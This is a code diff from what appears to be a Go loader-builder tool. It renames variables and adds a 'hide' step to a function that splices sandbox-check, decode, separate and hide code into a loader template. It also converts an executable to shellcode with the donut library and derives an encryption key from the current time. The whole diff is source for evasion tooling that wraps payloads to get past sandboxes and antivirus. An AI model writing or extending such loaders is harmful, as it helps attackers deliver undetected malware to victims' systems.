@@ -11,55 +11,52 @@ import (
 )
 
 //给loader文件插入代码，需注意import的库需要去重
-func addext(Timestart []string, method string) {
-	loaderfilebyte, _ := ioutil.ReadFile(path.Join(TEMP_DIR, "main.go"))
-	loaderfile := string(loaderfilebyte)
-	//fmt.Printf("%q", strings.Split(loaderfile, "//__IMPORT__")[0])
-	//println(len(strings.Split(loaderfile, "//__IMPORT__")))
-	var replacestring string
+func addCode(Code []string, method string) {
+	loaderFileByte, _ := ioutil.ReadFile(path.Join(TempDir, "main.go"))
+	loaderFile := string(loaderFileByte)
+	var replaceString string
 	switch method {
 	case "sandbox":
-		replacestring = "//__SANDBOX__"
+		replaceString = "//__SANDBOX__"
 	case "decode":
-		replacestring = "//__DECODE__"
-	case "fenli":
-		replacestring = "//__FENLI__"
+		replaceString = "//__DECODE__"
+	case "separate":
+		replaceString = "//__SEPARATE__"
+	case "hide":
+		replaceString = "//__HIDE__"
 	}
-	loaderfile = strings.Replace(loaderfile, replacestring, Timestart[0], 1)
-	//loaderfile = strings.Replace(loaderfile, "//__IMPORT__", Timestart[1], 1)
-	var importfield = strings.SplitAfter(loaderfile, "//__IMPORT__")[0]
-	unimportfield := strings.SplitAfter(loaderfile, "//__IMPORT__")[1]
-	imports := strings.Split(importfield, "\n")
+	loaderFile = strings.Replace(loaderFile, replaceString, Code[0], 1)
+	importField := strings.SplitAfter(loaderFile, "//__IMPORT__")[0]
+	unImportField := strings.SplitAfter(loaderFile, "//__IMPORT__")[1]
+	imports := strings.Split(importField, "\n")
 	new := make([]string, 0)
 	for i := 0; i < len(imports); i++ {
-		if strings.Index(Timestart[1], imports[i]) == -1 {
+		if strings.Index(Code[1], imports[i]) == -1 {
 			new = append(new, imports[i]+"\n")
 		}
 	}
 	new = append(new, "\t//__IMPORT__\n")
-	//fmt.Printf("%q\n", imports)
-	//fmt.Printf("%q\n", new)
-	//println(importfield)
-	final := strings.Replace(strings.Join(new, "")+unimportfield, "//__IMPORT__", Timestart[1], 1)
+
+	final := strings.Replace(strings.Join(new, "")+unImportField, "//__IMPORT__", Code[1], 1)
 	//println(final)
-	ioutil.WriteFile(path.Join(TEMP_DIR, "main.go"), []byte(final), os.ModePerm)
+	ioutil.WriteFile(path.Join(TempDir, "main.go"), []byte(final), os.ModePerm)
 }
 
 func PE2shellcode(srcFile string) {
-	donutconfig := donut.DefaultConfig()
-	payload, err := donut.ShellcodeFromFile(srcFile, donutconfig)
+	donutConfig := donut.DefaultConfig()
+	payload, err := donut.ShellcodeFromFile(srcFile, donutConfig)
 	if err != nil {
 		log.Println(err)
 	}
-	err = ioutil.WriteFile(path.Join(TEMP_DIR, "shellcode"), payload.Bytes(), os.ModePerm)
+	err = ioutil.WriteFile(path.Join(TempDir, "shellcode"), payload.Bytes(), os.ModePerm)
 	if err != nil {
 		log.Println(err)
 	}
 }
 
-func generatekey() []byte {
-	key := (time.Now().String()[5:27])
-	err := ioutil.WriteFile(path.Join(TEMP_DIR, "key"), []byte(key), os.ModePerm)
+func generateKey() []byte {
+	key := time.Now().String()[5:27]
+	err := ioutil.WriteFile(path.Join(TempDir, "key"), []byte(key), os.ModePerm)
 	if err != nil {
 		log.Println(err)
 	}
